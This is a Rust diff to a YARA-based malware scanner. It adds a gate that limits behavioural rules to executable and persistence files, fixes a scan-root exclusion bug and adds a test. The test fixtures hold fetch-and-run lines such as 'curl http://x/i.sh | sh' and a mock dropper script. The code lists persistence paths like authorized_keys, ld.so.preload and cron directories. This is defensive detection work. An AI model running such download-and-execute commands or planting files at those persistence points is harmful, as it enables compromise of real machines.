@@ -177,6 +177,130 @@ fn is_skipped_scan_ext(ext: &str) -> bool {
     )
 }
 
+/// Extensions of files that RUN: interpreted scripts, compiled executables and
+/// shared objects, and unit/autostart configs that execute a command line.
+const ACTIVE_EXTS: &[&str] = &[
+    // shells
+    "sh", "bash", "zsh", "ksh", "fish", "csh", "dash", "command", // interpreters
+    "py", "pyw", "pl", "pm", "rb", "php", "lua", "tcl", "awk", "sed",
+    // js/ts (npm/pip supply-chain payloads run here)
+    "js", "mjs", "cjs", "jsx", "ts", "node", // windows scripting
+    "ps1", "psm1", "psd1", "bat", "cmd", "com", "vbs", "vbe", "wsf", "wsh", "hta",
+    // compiled executables / libraries
+    "exe", "dll", "so", "dylib", "bin", "elf", "out", "ko", "jar", "msi", "scr",
+    // service / autostart units that execute a command
+    "service", "socket", "timer", "desktop",
+];
+
+/// Filenames that are executed or SOURCED at login / by a daemon, so the
+/// persistence rules must still see them even though they carry no exec bit and
+/// no script extension. History files (`.bash_history`, …) are deliberately NOT
+/// here: they are a LOG of past commands, not something that runs.
+const ACTIVE_NAMES: &[&str] = &[
+    ".bashrc",
+    ".bash_profile",
+    ".bash_login",
+    ".bash_logout",
+    ".profile",
+    ".zshrc",
+    ".zprofile",
+    ".zshenv",
+    ".zlogin",
+    ".kshrc",
+    ".cshrc",
+    ".tcshrc",
+    ".login",
+    ".xprofile",
+    ".xsession",
+    ".xinitrc",
+    "authorized_keys",
+    "authorized_keys2",
+    "crontab",
+    "rc.local",
+    "ld.so.preload",
+    "sudoers",
+    ".netrc",
+];
+
+/// Path fragments (normalised to `/`, lowercased) that hold persistence configs
+/// which run a command: cron, systemd units, init scripts, autostart, ssh.
+const PERSIST_PATHS: &[&str] = &[
+    "/etc/cron",
+    "/etc/systemd",
+    "/etc/profile.d",
+    "/etc/init.d",
+    "/etc/init/",
+    "/etc/rc",
+    "/etc/update-motd.d",
+    "/etc/ld.so.preload",
+    "/etc/sudoers",
+    "/systemd/system/",
+    "/systemd/user/",
+    "/.config/systemd",
+    "/.config/autostart",
+    "/.ssh/",
+];
+
+/// True when `path` is content that can actually EXECUTE (script, binary,
+/// persistence config) rather than an inert document that merely mentions a
+/// technique. The behavioural YARA rules only make sense against the former; a
+/// transcript, `.txt` log, markdown file or shell-history that quotes
+/// `docker.sock` or `curl | sh` is not an incident. Qualifies on any of: a Unix
+/// execute bit, a script/executable extension, a login/daemon-sourced filename,
+/// a persistence path, or a script shebang / binary magic in the first bytes.
+fn is_active_content(path: &Path, meta: &std::fs::Metadata, head: &[u8]) -> bool {
+    // 1. Unix execute bit — the strongest signal that a file is meant to run.
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::MetadataExt;
+        if meta.mode() & 0o111 != 0 {
+            return true;
+        }
+    }
+    #[cfg(not(unix))]
+    {
+        let _ = meta;
+    }
+
+    let lower = path
+        .to_string_lossy()
+        .replace('\\', "/")
+        .to_ascii_lowercase();
+
+    // 2. Executable / script extension.
+    if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
+        if ACTIVE_EXTS.contains(&ext.to_ascii_lowercase().as_str()) {
+            return true;
+        }
+    }
+
+    // 3. Login / daemon-sourced filename (rc files, authorized_keys, crontab…).
+    let name = lower.rsplit('/').next().unwrap_or("");
+    if ACTIVE_NAMES.contains(&name) {
+        return true;
+    }
+
+    // 4. Under a persistence directory.
+    if PERSIST_PATHS.iter().any(|p| lower.contains(p)) {
+        return true;
+    }
+
+    // 5. Shebang script, or a compiled-executable magic number.
+    if head.starts_with(b"#!") {
+        return true;
+    }
+    let magic_execish = head.starts_with(b"\x7fELF")            // ELF
+        || head.starts_with(b"MZ")                              // PE / DOS
+        || head.starts_with(&[0xFE, 0xED, 0xFA, 0xCE])          // Mach-O 32
+        || head.starts_with(&[0xFE, 0xED, 0xFA, 0xCF])          // Mach-O 64
+        || head.starts_with(&[0xCA, 0xFE, 0xBA, 0xBE]); // Mach-O universal / Java class
+    if magic_execish {
+        return true;
+    }
+
+    false
+}
+
 /// Reject rule-file names that are anything other than a single, plain path
 /// component — no `/`, `\`, or `..` — so a crafted `yara_config.json` entry
 /// cannot escape the rules directory when used in `dir.join(file)` / the fetch
@@ -641,7 +765,8 @@ impl YaraEngine {
         out
     }
 
-    /// Scan a single file (skipped if larger than `max_bytes`).
+    /// Scan a single file (skipped if larger than `max_bytes`, or if it is not
+    /// active content - see [`is_active_content`]).
     pub fn scan_file(&self, path: &Path, max_bytes: usize) -> Vec<YaraMatch> {
         let meta = match std::fs::metadata(path) {
             Ok(m) => m,
@@ -651,7 +776,20 @@ impl YaraEngine {
             return Vec::new();
         }
         match std::fs::read(path) {
-            Ok(data) => self.scan_bytes(&path.to_string_lossy(), &data),
+            Ok(data) => {
+                // Behavioural rules describe things that EXECUTE - scripts,
+                // binaries, persistence configs. A document that merely QUOTES a
+                // technique (a transcript, a .txt log, shell history, an editor's
+                // README) is not a threat, and on an active workstation those
+                // documents vastly outnumber real payloads, so scanning them is
+                // almost pure false positive. Only scan a file that can actually
+                // run or is a known persistence target.
+                let head = &data[..data.len().min(256)];
+                if !is_active_content(path, &meta, head) {
+                    return Vec::new();
+                }
+                self.scan_bytes(&path.to_string_lossy(), &data)
+            }
             Err(_) => Vec::new(),
         }
     }
@@ -728,6 +866,16 @@ impl YaraEngine {
         {
             return;
         }
+        // Exclusion is checked HERE, at the top, so it applies to the scan ROOT
+        // as well as to children. Previously it was only tested per-child during
+        // directory iteration, so a configured root that is itself an excluded
+        // tree (e.g. `/usr/bin` in the per-OS scan_paths, or the Legion binary
+        // path) was walked wholesale — the root was never filtered. That let the
+        // distro's own /usr/bin and Legion's installed binary self-match every
+        // behavioural rule (observed live 2026-08: 107 YARA FPs, score pinned 0).
+        if crate::fsroots::is_excluded_scan_dir(path) {
+            return;
+        }
         let meta = match std::fs::symlink_metadata(path) {
             Ok(m) => m,
             Err(_) => return,
@@ -740,11 +888,9 @@ impl YaraEngine {
                 return;
             };
             for entry in entries.flatten() {
-                let p = entry.path();
-                if crate::fsroots::is_excluded_scan_dir(&p) {
-                    continue;
-                }
-                self.walk(&p, max_bytes, max_files, deadline, scanned, out);
+                // Child exclusion is enforced by the check at the top of the
+                // recursive call; no need to re-test here.
+                self.walk(&entry.path(), max_bytes, max_files, deadline, scanned, out);
                 if *scanned >= max_files {
                     return;
                 }
@@ -1877,6 +2023,53 @@ mod tests {
         let e = engine(r#"rule R { strings: $a = "hello" condition: $a }"#);
         assert_eq!(e.scan_bytes("t", b"say hello world").len(), 1);
         assert_eq!(e.scan_bytes("t", b"nothing here").len(), 0);
+    }
+
+    #[test]
+    fn active_content_gate_skips_documents_scans_executables() {
+        use std::io::Write;
+        let dir = tempfile::tempdir().unwrap();
+        let write = |name: &str, bytes: &[u8]| {
+            let p = dir.path().join(name);
+            let mut f = std::fs::File::create(&p).unwrap();
+            f.write_all(bytes).unwrap();
+            p
+        };
+        let is_active = |p: &std::path::Path| {
+            let m = std::fs::metadata(p).unwrap();
+            let d = std::fs::read(p).unwrap();
+            is_active_content(p, &m, &d[..d.len().min(256)])
+        };
+
+        // Documents that merely QUOTE techniques — must NOT be scanned.
+        let transcript = write(
+            "session-0604b339.txt",
+            b"we discussed /var/run/docker.sock and curl | sh",
+        );
+        let history = write(".bash_history", b"curl http://x/i.sh | sh\n");
+        let readme = write("README.md", b"run `LD_PRELOAD=./x.so foo` to reproduce");
+        assert!(!is_active(&transcript), "transcript should be skipped");
+        assert!(!is_active(&history), ".bash_history should be skipped");
+        assert!(!is_active(&readme), "markdown should be skipped");
+
+        // Things that RUN or persist — must be scanned.
+        let script = write("dropper.sh", b"#!/bin/sh\ncurl x|sh\n");
+        let shebang_noext = write("payload", b"#!/usr/bin/env python\nimport os\n");
+        let elf = write("mal", b"\x7fELFrest-of-binary");
+        let bashrc = write(".bashrc", b"export PATH=$PATH\n");
+        assert!(is_active(&script), ".sh must be scanned");
+        assert!(is_active(&shebang_noext), "shebang script must be scanned");
+        assert!(is_active(&elf), "ELF binary must be scanned");
+        assert!(is_active(&bashrc), ".bashrc (persistence) must be scanned");
+
+        // Execute bit alone qualifies an extensionless plain file.
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let exec = write("tool", b"plain text but marked executable");
+            std::fs::set_permissions(&exec, std::fs::Permissions::from_mode(0o755)).unwrap();
+            assert!(is_active(&exec), "exec-bit file must be scanned");
+        }
     }
 
     #[test]
